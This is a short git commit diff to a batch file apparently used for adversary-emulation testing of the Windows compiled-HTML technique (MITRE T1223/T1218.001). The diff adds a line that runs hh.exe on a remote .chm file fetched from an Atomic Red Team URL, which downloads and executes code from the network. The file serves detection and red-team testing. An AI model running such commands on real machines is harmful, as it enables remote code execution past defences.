15cdd5137276cbc10b9eb25a2f17cbf6c6b42301
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 15:11:17 +0530

    Update T1223.bat

--- Payloads/T1223/T1223.bat
+++ Payloads/T1223/T1223.bat
@@ -9,4 +9,5 @@ ECHO.
 ECHO [+] Executing 'hh.exe' 
 ECHO -------------------------------------------------------------------
 hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
+hh.exe https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm
 ECHO.
